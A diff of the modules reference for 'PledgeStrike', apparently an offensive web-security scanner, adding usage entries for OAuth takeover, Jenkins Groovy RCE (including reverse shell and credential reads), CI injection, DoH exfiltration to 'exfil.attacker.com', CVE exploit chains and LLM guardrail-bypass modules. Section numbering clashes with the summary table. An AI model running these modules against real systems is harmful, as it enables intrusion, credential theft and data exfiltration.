@@ -1,6 +1,6 @@
 # PledgeStrike — Modules Reference
 
-**Last updated:** 2026-08-02
+**Last updated:** 2026-08-07
 
 ---
 
@@ -418,12 +418,183 @@ pledgestrike ssrf probe --target "https://target.com/fetch?url={SSRF}"
 
 ---
 
+## ✅ Ready & Working — Auth & Identity Modules (Phase 4)
+
+### 39. OAuth Account Takeover — `oauth ato`
+**Status: READY**
+
+Tests OAuth flows for account takeover via redirect_uri manipulation, state fixation, and PKCE bypass. Sends 22 ATO payloads including open redirect via path, subdomain, @, #, //, path traversal, encoded variants, CR/LF injection, null byte, authority bypass, data URI, javascript URI, state fixation, and PKCE bypass vectors.
+
+**How it works:**
+Sends crafted OAuth authorization requests with manipulated `redirect_uri` parameters pointing to `evil.com`. Checks if the server redirects to the attacker-controlled domain (not just echoing the query string). State/PKCE checks require a 302 redirect with `code=` or `state=` parameters to confirm a successful bypass.
+
+**How to use:**
+```
+pledgestrike oauth ato --auth-url https://target.com/oauth/authorize
+```
+
+**If a vulnerability exists:**
+An attacker can hijack the OAuth flow to redirect victims to a malicious site, steal authorization codes, bypass state/PKCE protections, and achieve full account takeover.
+
+**Validated against:** `pledgeandgrow.com` (0/22 — no false positives), `sandbox-360.kis-studio.fr` (0/22 — no false positives)
+
+---
+
+### 40. OIDC Token Confusion — `oidc confuse`
+**Status: READY**
+
+Tests OpenID Connect for token confusion, hybrid flow abuse, and mix-up attacks. Discovers 10 OIDC endpoints (discovery, JWKS, authorize, token, userinfo, introspect, revoke, logout, register, device auth) and sends 15 confusion payloads.
+
+**How it works:**
+Discovers OIDC endpoints via `/.well-known/openid-configuration` and standard OAuth2 paths. Sends token confusion payloads: code as id_token, hybrid flow abuse, implicit token confusion, access token as ID token, JWT alg=none, HS256 with RS256 key, issuer/audience confusion, nonce reuse, c_hash mismatch, token replay, token exchange, refresh token as access, cross-tenant token, and claim injection.
+
+**How to use:**
+```
+pledgestrike oidc confuse --url https://target.com
+```
+
+**If a vulnerability exists:**
+An attacker can mix up token types, bypass authentication checks, escalate privileges, or access resources across tenants.
+
+**Validated against:** `pledgeandgrow.com` (0/15), `sandbox-360.kis-studio.fr` (0/15, 10 endpoints discovered)
+
+---
+
+### 41. Passkey/FIDO2 Registration Abuse — `passkey abuse`
+**Status: READY**
+
+Tests passkey registration for cross-device auth bypass and credential injection. Discovers 8 WebAuthn endpoints and sends 19 abuse payloads (12 registration + 7 authentication).
+
+**How it works:**
+Discovers WebAuthn endpoints (`/webauthn/register/begin`, `/webauthn/auth/begin`, `/webauthn/credentials`, etc.). Sends registration abuse payloads: cross-device auth bypass, credential injection without attestation, weak RP ID, origin bypass, RP ID mismatch, user ID injection, resident key abuse, large blob injection, PRF extension abuse, attestation bypass, UV bypass, multi-credential. Also sends auth abuse: assertion without challenge, assertion replay, cross-origin assertion, credential ID injection, empty/admin user handle, backup eligibility bypass.
+
+**How to use:**
+```
+pledgestrike passkey abuse --url https://target.com
+```
+
+**If a vulnerability exists:**
+An attacker can register rogue credentials, bypass attestation/origin checks, inject credentials for other users, or bypass user verification requirements.
+
+**Validated against:** `pledgeandgrow.com` (0/19, 6 endpoints found), `sandbox-360.kis-studio.fr` (0/19, 2 endpoints found)
+
+---
+
+### 42. SSO Session Hijacking — `sso hijack`
+**Status: READY**
+
+Tests SSO implementations for session fixation, token replay, and cross-tenant access. Discovers 15 SSO endpoints and sends 18 hijack vectors.
+
+**How it works:**
+Discovers SSO endpoints (`/sso/login`, `/sso/callback`, `/saml/acs`, `/saml/slo`, `/saml/metadata`, `/oauth2/authorize`, `/oauth2/callback`, `/oauth2/token`, `/api/session`, etc.). Sends hijack payloads: session fixation (cookie/param), token replay (Bearer/X-Auth-Token), cross-tenant access (header/path), SAML response replay, SAML assertion injection, OIDC code/token replay, session token in URL, JWT replay, refresh token abuse, WS-Fed/ADFS token replay, session prediction.
+
+**How to use:**
+```
+pledgestrike sso hijack --url https://target.com
+```
+
+**If a vulnerability exists:**
+An attacker can hijack SSO sessions, replay stolen tokens, access cross-tenant resources, or predict/guess session identifiers.
+
+**Validated against:** `pledgeandgrow.com` (0/18, 0 endpoints), `sandbox-360.kis-studio.fr` (0/18, 15 endpoints found)
+
+---
+
+### 43. Magic Link Abuse — `magiclink abuse`
+**Status: READY**
+
+Tests magic link authentication for token leakage, replay, and cross-user authentication. Discovers 8 magic link endpoints and sends 25 abuse vectors (9 token leakage + 16 replay/cross-user).
+
+**How it works:**
+Discovers magic link endpoints (`/auth/magic/request`, `/auth/magic/verify`, `/auth/magic/callback`, `/auth/status`, `/auth/token`, etc.). Sends token leakage vectors: Referer header leak, Referer with token, open redirect + token, token in URL fragment/query, meta refresh, postMessage, CORS, preload, DNS rebinding. Sends replay vectors: direct/expired/used token replay, cross-user token, token brute (short/numeric/pattern), email parameter injection, email change mid-flow, token concatenation, token SQLi/NoSQLi, token type confusion, mass token request, token in header/cookie.
+
+**How to use:**
+```
+pledgestrike magiclink abuse --url https://target.com
+```
+
+**If a vulnerability exists:**
+An attacker can leak magic link tokens via Referer headers, replay expired/used tokens, brute-force short tokens, or authenticate as other users via cross-user token injection.
+
+**Validated against:** `pledgeandgrow.com` (0 leaks, 0 replay), `sandbox-360.kis-studio.fr` (0 leaks, 0 replay, 8 endpoints found)
+
+---
+
+## ✅ Ready & Working — CI/CD Attack Modules (Phase 5)
+
+### 44. Jenkins RCE — `jenkins rce`
+**Status: READY**
+
+Tests Jenkins for unauthenticated access, script console RCE, and credential extraction. Scans 20 API endpoints and sends 21 Groovy payloads.
+
+**How it works:**
+Discovers Jenkins endpoints by checking for `X-Jenkins` or `X-Hudson` headers and rejecting generic HTML responses. Scans API endpoints: Jenkins root, login, API JSON, computer API, people, builds, plugins, credentials, script console, CLI, JNLP, remoting, system info, queue, nodes, artifacts. Sends Groovy script console payloads: command execution, env exfil, file reads (`/etc/passwd`, `~/.ssh/id_rsa`), Jenkins secrets listing, credential decryption, job enumeration, shell execution, reverse shell, file download, security disable, admin creation, environment/props read, thread dump, filesystem listing, network scan.
+
+**How to use:**
+```
+pledgestrike jenkins rce --url https://target.com:8080
+```
+
+**If a vulnerability exists:**
+An attacker can execute arbitrary code on the Jenkins server, read sensitive files, extract encrypted credentials, disable security, or create admin accounts.
+
+**Validated against:** `pledgeandgrow.com` (0/21 — no false positives), `sandbox-360.kis-studio.fr` (0/21 — no false positives)
+
+---
+
+### 45. GitLab CI Injection — `gitlabci inject`
+**Status: READY**
+
+Tests GitLab CI pipelines for command injection via MR titles, commit messages, and variables. Scans 15 API endpoints and sends 20 injection vectors.
+
+**How it works:**
+Discovers GitLab API endpoints by checking for `X-Gitlab` header and requiring JSON responses (rejects HTML). Scans endpoints: projects, pipelines, jobs, job traces, variables, group variables, runners, triggers, environments, deploy tokens, secrets, CI/CD settings. Sends injection vectors: MR title/description command substitution, backticks, env/secret exfil, commit message injection, branch name IFS bypass, tag name/message injection, variable value/key RCE, pipeline schedule cron/command injection, $variable expansion, ${variable}, base64 exec, newline + run.
+
+**How to use:**
+```
+pledgestrike gitlabci inject --url https://target.com
+```
+
+**If a vulnerability exists:**
+An attacker can inject commands into CI/CD pipelines via crafted MR titles, commit messages, branch names, or variable values, leading to RCE on CI runners and secret exfiltration.
+
+**Validated against:** `pledgeandgrow.com` (0/20 — no false positives), `sandbox-360.kis-studio.fr` (0/20 — no false positives)
+
+---
+
+## ✅ Ready & Working — Covert Channels (Phase 7)
+
+### 46. Steganography Detection — `stego detect`
+**Status: READY**
+
+Detects hidden data in images (LSB steganography, metadata injection, trailing data) on web pages. Probes 21 common image paths and analyzes found images.
+
+**How it works:**
+1. Probes 21 common image paths (image.png, img.png, logo.png, banner.png, hero.png, background.png, favicon.png, and .jpg/.gif/.bmp/.webp/.tiff/.ico/.svg variants)
+2. Downloads and analyzes each image found
+3. Checks LSB pattern distribution (values close to 0.5 indicate possible steganography)
+4. Calculates Shannon entropy (high entropy may indicate encrypted hidden data)
+5. Detects trailing data after image end markers (IEND for PNG, FFD9 for JPEG)
+6. Checks for PNG chunk anomalies and metadata overflow
+
+**How to use:**
+```
+pledgestrike stego detect --url https://target.com/images/
+```
+
+**If a vulnerability exists:**
+Hidden data may be embedded in images for covert communication, data exfiltration, or C2 channels. High LSB values, abnormal entropy, or trailing data after end markers indicate potential steganographic content.
+
+**Validated against:** `pledgeandgrow.com` (21 paths, 0 findings), `sandbox-360.kis-studio.fr` (21 paths, 0 findings)
+
+---
+
 ## ❌ Known Issues
 
 ### 37. TLS Scanner — `tls scan`
-**Status: FIXED (timeout added, needs retest)**
+**Status: READY**
 
-Timeout was added to `TcpStream::connect` and TLS read operations to prevent indefinite hangs. The fix has been compiled but not yet tested against a live target.
+CryptoProvider crash fixed (rustls ring provider installed). Timeout added to `TcpStream::connect` and TLS read operations to prevent indefinite hangs.
 
 **How to use:**
 ```
@@ -498,7 +669,7 @@ pledgestrike ssti detect --url https://target.com/page --param name
 ---
 
 ### 44. HTTP Request Smuggling — `smuggle detect`
-**Status: UNTESTED**
+**Status: READY**
 
 Tests for HTTP request smuggling via CL.TE and TE.CL desync attacks between reverse proxy and backend.
 
@@ -540,7 +711,7 @@ pledgestrike ssrf chain --url https://target.com/fetch?url={SSRF}
 ---
 
 ### 47. Race Condition — `race race`
-**Status: UNTESTED**
+**Status: READY**
 
 Sends concurrent requests to exploit TOCTOU race conditions (coupon redemption, voting, balance transfers).
 
@@ -554,7 +725,7 @@ pledgestrike race race --url https://target.com/api/redeem --method POST --body 
 ---
 
 ### 48. DNS Rebinding — `rebind attack`
-**Status: UNTESTED**
+**Status: READY**
 
 Exploits DNS rebinding to bypass SSRF filters — first resolution returns attacker IP, second returns internal IP.
 
@@ -567,17 +738,17 @@ pledgestrike rebind attack --target https://target.com --interval 5 --count 10
 
 ---
 
-### 49. ACL Check — `acl check`
-**Status: UNTESTED**
+### 49. ACL/IDOR Check — `acl idor`
+**Status: READY**
 
-Tests access control lists (AWS S3 bucket policies, cloud IAM permissions).
+Tests for IDOR/BOLA by iterating resource IDs. Fixed false positives: rejects HTML SPA catch-all responses and detects identical response bodies.
 
 **How to use:**
 ```
-pledgestrike acl check --url https://target.com
+pledgestrike acl idor --url https://target.com/api/user/1 --start-id 1 --count 10
 ```
 
-**Applicable when:** Target has ACL-protected resources (S3 buckets, cloud storage, IAM-protected APIs).
+**Applicable when:** Target has ACL-protected resources with sequential IDs (S3 buckets, cloud storage, IAM-protected APIs).
 
 ---
 
@@ -798,8 +969,8 @@ pledgestrike shell upload --url https://target.com/upload
 
 ---
 
-### 65. Rate Limit Bypass — `ratelimit check`
-**Status: UNTESTED**
+### 65. Rate Limit Bypass — `ratelimit burst`
+**Status: READY**
 
 Tests if API rate limiting can be bypassed via IP rotation, header manipulation, or parameter pollution.
 
@@ -855,7 +1026,7 @@ pledgestrike brute http --url https://target.com/login --users-file users.txt --
 ---
 
 ### 69. Cache Poisoning — `cache poison`
-**Status: UNTESTED**
+**Status: READY**
 
 Tests CDN caching (Cloudflare, Varnish, Fastly) for cache poisoning via header injection.
 
@@ -884,17 +1055,17 @@ pledgestrike spray password --url https://target.com/owa --users-file users.txt 
 
 ## ⏳ Untested — Protocol-Specific Modules
 
-### 71. Protocol Fingerprinting — `proto enum`
-**Status: UNTESTED**
+### 71. Prototype Pollution — `proto scan`
+**Status: READY**
 
-Fingerprints unknown protocols by sending probe packets and analyzing responses.
+Scans for prototype pollution by injecting `__proto__` and `constructor.prototype` payloads.
 
 **How to use:**
 ```
-pledgestrike proto enum --host target.com --port 8080
+pledgestrike proto scan --url https://target.com/
 ```
 
-**Applicable when:** Target exposes unknown protocols on non-standard ports.
+**Applicable when:** Target uses Node.js/Express with object merging or query string parsing.
 
 ---
 
@@ -912,14 +1083,14 @@ pledgestrike grpc enum --url https://target.com:50051
 
 ---
 
-### 73. HTTP/2 Detection — `h2 detect`
-**Status: UNTESTED**
+### 73. HTTP/2 Rapid Reset — `h2 rapidreset`
+**Status: READY**
 
-Tests for HTTP/2 specific attacks (h2c smuggling, stream multiplexing abuse).
+Tests for HTTP/2 Rapid Reset attack (CVE-2023-44487) — sends and cancels streams to overwhelm the server.
 
 **How to use:**
 ```
-pledgestrike h2 detect --url https://target.com
+pledgestrike h2 rapidreset --url https://target.com/
 ```
 
 **Applicable when:** Target supports HTTP/2.
@@ -1591,6 +1762,330 @@ pledgestrike takeover scan --domains-file subdomains.txt
 
 ---
 
+### 121. LLM Data Exfiltration — `llm exfil`
+**Status: UNTESTED**
+
+Tests LLM endpoints for data exfiltration via crafted prompts that cause the model to leak training data or system information.
+
+**How to use:**
+```
+pledgestrike llm exfil --url https://target.com/chat
+```
+
+---
+
+### 122. LLM Safety Bypass — `llm bypass`
+**Status: UNTESTED**
+
+Tests LLM safety guardrails by attempting to bypass content filters and safety mechanisms.
+
+**How to use:**
+```
+pledgestrike llm bypass --url https://target.com/chat
+```
+
+---
+
+### 123. AI Model Stealing — `ai extract`
+**Status: UNTESTED**
+
+Extracts model decision boundaries via repeated API queries to reconstruct the underlying model.
+
+**How to use:**
+```
+pledgestrike ai extract --url https://target.com/predict --queries 1000
+```
+
+---
+
+### 124. AI Hyperparameter Inference — `ai hyper`
+**Status: UNTESTED**
+
+Infers model hyperparameters through timing analysis and output patterns.
+
+**How to use:**
+```
+pledgestrike ai hyper --url https://target.com/predict
+```
+
+---
+
+### 125. AI Adversarial Evasion — `ai adversarial`
+**Status: UNTESTED**
+
+Tests for adversarial evasion by perturbing inputs to cause misclassification.
+
+**How to use:**
+```
+pledgestrike ai adversarial --url https://target.com/classify --input-type text
+```
+
+---
+
+### 126. Vector DB Extraction — `vectordb extract`
+**Status: UNTESTED**
+
+Extracts vectors and metadata from unauthenticated vector databases (Pinecone, Weaviate, Chroma, Milvus).
+
+**How to use:**
+```
+pledgestrike vectordb extract --url https://target.com:8000 --limit 100
+```
+
+---
+
+### 127. Vector DB Enumeration — `vectordb enum`
+**Status: UNTESTED**
+
+Enumerates collections, indexes, and schema from vector databases.
+
+**How to use:**
+```
+pledgestrike vectordb enum --url https://target.com:8000
+```
+
+---
+
+### 128. Vector DB Probe — `vectordb probe`
+**Status: READY**
+
+Tests for unauthenticated access and open endpoints on vector databases.
+
+**How to use:**
+```
+pledgestrike vectordb probe --url https://target.com:8000
+```
+
+---
+
+### 129. AWS IAM Privilege Escalation — `aws privesc`
+**Status: UNTESTED**
+
+Tests AWS IAM for privilege escalation paths (18+ escalation vectors).
+
+**How to use:**
+```
+pledgestrike aws privesc --token <AWS_TOKEN>
+```
+
+---
+
+### 130. AWS Lambda Injection — `aws lambda-inject`
+**Status: UNTESTED**
+
+Tests Lambda functions for code injection via event payload manipulation.
+
+**How to use:**
+```
+pledgestrike aws lambda-inject --url https://lambda.target.com/ --token <TOKEN>
+```
+
+---
+
+### 131. GCP Service Account Abuse — `gcp abuse`
+**Status: UNTESTED**
+
+Tests GCP service account for excessive scopes and IAM misconfigurations.
+
+**How to use:**
+```
+pledgestrike gcp abuse --token <GCP_TOKEN>
+```
+
+---
+
+### 132. Azure AD App Abuse — `azure app`
+**Status: UNTESTED**
+
+Tests Azure AD service principals and app registrations for excessive permissions.
+
+**How to use:**
+```
+pledgestrike azure app --tenant target.onmicrosoft.com --token <AZURE_TOKEN>
+```
+
+---
+
+### 133. Terraform State Exploit — `tfstate exploit`
+**Status: UNTESTED**
+
+Exploits exposed Terraform state files to extract secrets and infrastructure data.
+
+**How to use:**
+```
+pledgestrike tfstate exploit --bucket target-tfstate
+```
+
+---
+
+### 134. Istio Mesh Enumeration — `istio enum`
+**Status: UNTESTED**
+
+Enumerates Istio service mesh — istiod debug endpoints, Envoy admin, service registry.
+
+**How to use:**
+```
+pledgestrike istio enum --url http://target.com:15010
+```
+
+---
+
+### 135. Istio Control Plane Probe — `istio probe`
+**Status: READY**
+
+Tests for unauthenticated access to Istio control plane.
+
+**How to use:**
+```
+pledgestrike istio probe --url http://target.com:15010
+```
+
+---
+
+### 136. ArgoCD Enumeration — `argocd enum`
+**Status: UNTESTED**
+
+Enumerates ArgoCD — applications, clusters, repos, secrets, projects.
+
+**How to use:**
+```
+pledgestrike argocd enum --url https://target.com --token <TOKEN>
+```
+
+---
+
+### 137. ArgoCD API Probe — `argocd probe`
+**Status: READY**
+
+Tests for unauthenticated access to ArgoCD API.
+
+**How to use:**
+```
+pledgestrike argocd probe --url https://target.com
+```
+
+---
+
+### 138. DOM Clobbering — `dom clobber`
+**Status: READY**
+
+DOM clobbering attack — inject HTML elements to override JavaScript variables.
+
+**How to use:**
+```
+pledgestrike dom clobber --url https://target.com/page
+```
+
+---
+
+### 139. Cross-Site Leak Detection — `xsleak detect`
+**Status: READY**
+
+Detects cross-site leak vectors — timing, error events, frame count, navigation.
+
+**How to use:**
+```
+pledgestrike xsleak detect --url https://target.com/page
+```
+
+---
+
+### 140. GitHub Actions Injection — `gha inject`
+**Status: UNTESTED**
+
+Tests GitHub Actions workflows for script injection via PR titles, issue bodies, branch names, and ${{ }} expressions.
+
+**How to use:**
+```
+pledgestrike gha inject --repo owner/repo --token <GITHUB_TOKEN>
+```
+
+---
+
+### 141. AD CS Abuse — `adcs abuse`
+**Status: UNTESTED**
+
+AD CS abuse — ESC1-ESC14 vulnerability paths, NTLM relay to web enrollment.
+
+**How to use:**
+```
+pledgestrike adcs abuse --url https://target.com/certsrv --ca-name "CA-Name"
+```
+
+---
+
+### 142. PetitPotam Attack — `ad petitpotam`
+**Status: UNTESTED**
+
+PetitPotam attack — NTLM relay coercion via EFSRPC/LSARPC/ICPR against AD controllers.
+
+**How to use:**
+```
+pledgestrike ad petitpotam --url https://dc.target.com
+```
+
+---
+
+### 143. Ivanti CVE Chain — `ivanti cve`
+**Status: UNTESTED**
+
+Ivanti Connect Secure CVE-2023-46805 auth bypass + CVE-2024-21887 RCE chain.
+
+**How to use:**
+```
+pledgestrike ivanti cve --url https://target.com
+```
+
+---
+
+### 144. Confluence RCE — `confluence rce`
+**Status: UNTESTED**
+
+Confluence RCE — CVE-2023-22515 admin creation + CVE-2023-22518 import RCE.
+
+**How to use:**
+```
+pledgestrike confluence rce --url https://target.com
+```
+
+---
+
+### 145. DoH Exfiltration — `doh exfil`
+**Status: READY**
+
+DNS over HTTPS exfiltration — bypass DNS monitoring via DoH providers (cloudflare, google, quad9, etc.).
+
+**How to use:**
+```
+pledgestrike doh exfil --domain exfil.attacker.com --data "secret_data" --provider cloudflare
+```
+
+---
+
+### 146. ICMP Tunneling — `icmp tunnel`
+**Status: UNTESTED**
+
+ICMP tunneling — covert data exfiltration through firewalls via ICMP echo requests.
+
+**How to use:**
+```
+pledgestrike icmp tunnel --host target.com --data "secret_data"
+```
+
+---
+
+### 147. TLS Fingerprint Spoofing — `tls spoof`
+**Status: READY**
+
+JA3/JA4 TLS fingerprint spoofing to bypass TLS-based fingerprinting and WAF detection.
+
+**How to use:**
+```
+pledgestrike tls spoof --url https://target.com --ja3 "771,4865-4866-4867..."
+```
+
+---
+
 ## Summary Table
 
 | # | Module | Command | Status |
@@ -1633,17 +2128,17 @@ pledgestrike takeover scan --domains-file subdomains.txt
 | 36 | Exploit Search | `exploit search` | ✅ READY |
 | 37 | XXE | `xxe file` | ✅ READY |
 | 38 | SSRF | `ssrf probe` | ✅ READY |
-| 39 | TLS Scanner | `tls scan` | ❌ FIXED (needs retest) |
+| 39 | TLS Scanner | `tls scan` | ✅ READY |
 | 40 | Command Injection | `cmdi detect` | ⏳ UNTESTED |
 | 41 | LFI | `lfi read` | ⏳ UNTESTED |
 | 42 | NoSQL Injection | `nosqli mongo` | ⏳ UNTESTED |
 | 43 | SSTI | `ssti detect` | ⏳ UNTESTED |
-| 44 | HTTP Smuggling | `smuggle detect` | ⏳ UNTESTED |
+| 44 | HTTP Smuggling | `smuggle detect` | ✅ READY |
 | 45 | Padding Oracle | `padoracle detect` | ⏳ UNTESTED |
 | 46 | SSRF Chain | `ssrf chain` | ⏳ UNTESTED |
-| 47 | Race Condition | `race race` | ⏳ UNTESTED |
-| 48 | DNS Rebinding | `rebind attack` | ⏳ UNTESTED |
-| 49 | ACL Check | `acl check` | ⏳ UNTESTED |
+| 47 | Race Condition | `race race` | ✅ READY |
+| 48 | DNS Rebinding | `rebind attack` | ✅ READY |
+| 49 | ACL Check | `acl idor` | ✅ READY |
 | 50 | Payload Generator | `payload gen` | ⏳ UNTESTED |
 | 51 | API Enumeration | `api enum` | ⏳ UNTESTED |
 | 52 | JWT Analysis | `jwt check/crack/forge` | ⏳ UNTESTED |
@@ -1659,15 +2154,15 @@ pledgestrike takeover scan --domains-file subdomains.txt
 | 62 | CI/CD Injection | `cicd inject` | ⏳ UNTESTED |
 | 63 | Supply Chain | `supply typosquat` | ⏳ UNTESTED |
 | 64 | Webshell Upload | `shell upload` | ⏳ UNTESTED |
-| 65 | Rate Limit Bypass | `ratelimit check` | ⏳ UNTESTED |
+| 65 | Rate Limit Bypass | `ratelimit burst` | ✅ READY |
 | 66 | Mass Scanner | `mass scan` | ⏳ UNTESTED |
 | 67 | DNS Exfiltration | `exfil dns` | ⏳ UNTESTED |
 | 68 | HTTP Brute Force | `brute http` | ⏳ UNTESTED |
-| 69 | Cache Poisoning | `cache poison` | ⏳ UNTESTED |
+| 69 | Cache Poisoning | `cache poison` | ✅ READY |
 | 70 | Password Spraying | `spray password` | ⏳ UNTESTED |
-| 71 | Protocol Fingerprint | `proto enum` | ⏳ UNTESTED |
+| 71 | Prototype Pollution | `proto scan` | ✅ READY |
 | 72 | gRPC | `grpc enum` | ⏳ UNTESTED |
-| 73 | HTTP/2 | `h2 detect` | ⏳ UNTESTED |
+| 73 | HTTP/2 Rapid Reset | `h2 rapidreset` | ✅ READY |
 | 74 | WebSocket | `ws connect` | ⏳ UNTESTED |
 | 75 | WebDAV | `webdav enum` | ⏳ UNTESTED |
 | 76 | SSE Injection | `sse inject` | ⏳ UNTESTED |
@@ -1715,3 +2210,38 @@ pledgestrike takeover scan --domains-file subdomains.txt
 | 118 | Web3 Audit | `web3 audit` | ⏳ UNTESTED |
 | 119 | Git Exposure | `git enum` | ⏳ UNTESTED |
 | 120 | Subdomain Takeover | `takeover scan` | ⏳ UNTESTED |
+| 121 | OAuth ATO | `oauth ato` | ✅ READY |
+| 122 | OIDC Confusion | `oidc confuse` | ✅ READY |
+| 123 | Passkey Abuse | `passkey abuse` | ✅ READY |
+| 124 | SSO Hijack | `sso hijack` | ✅ READY |
+| 125 | Magic Link Abuse | `magiclink abuse` | ✅ READY |
+| 126 | Jenkins RCE | `jenkins rce` | ✅ READY |
+| 127 | GitLab CI Inject | `gitlabci inject` | ✅ READY |
+| 128 | Stego Detect | `stego detect` | ✅ READY |
+| 129 | LLM Exfil | `llm exfil` | ⏳ UNTESTED |
+| 130 | LLM Bypass | `llm bypass` | ⏳ UNTESTED |
+| 131 | AI Extract | `ai extract` | ⏳ UNTESTED |
+| 132 | AI Hyper | `ai hyper` | ⏳ UNTESTED |
+| 133 | AI Adversarial | `ai adversarial` | ⏳ UNTESTED |
+| 134 | Vectordb Extract | `vectordb extract` | ⏳ UNTESTED |
+| 135 | Vectordb Enum | `vectordb enum` | ⏳ UNTESTED |
+| 136 | Vectordb Probe | `vectordb probe` | ✅ READY |
+| 137 | AWS Privesc | `aws privesc` | ⏳ UNTESTED |
+| 138 | AWS Lambda Inject | `aws lambda-inject` | ⏳ UNTESTED |
+| 139 | GCP Abuse | `gcp abuse` | ⏳ UNTESTED |
+| 140 | Azure App | `azure app` | ⏳ UNTESTED |
+| 141 | TFState Exploit | `tfstate exploit` | ⏳ UNTESTED |
+| 142 | Istio Enum | `istio enum` | ⏳ UNTESTED |
+| 143 | Istio Probe | `istio probe` | ✅ READY |
+| 144 | ArgoCD Enum | `argocd enum` | ⏳ UNTESTED |
+| 145 | ArgoCD Probe | `argocd probe` | ✅ READY |
+| 146 | DOM Clobber | `dom clobber` | ✅ READY |
+| 147 | XS-Leak Detect | `xsleak detect` | ✅ READY |
+| 148 | GHA Inject | `gha inject` | ⏳ UNTESTED |
+| 149 | ADCS Abuse | `adcs abuse` | ⏳ UNTESTED |
+| 150 | AD PetitPotam | `ad petitpotam` | ⏳ UNTESTED |
+| 151 | Ivanti CVE | `ivanti cve` | ⏳ UNTESTED |
+| 152 | Confluence RCE | `confluence rce` | ⏳ UNTESTED |
+| 153 | DoH Exfil | `doh exfil` | ✅ READY |
+| 154 | ICMP Tunnel | `icmp tunnel` | ⏳ UNTESTED |
+| 155 | TLS Spoof | `tls spoof` | ✅ READY |
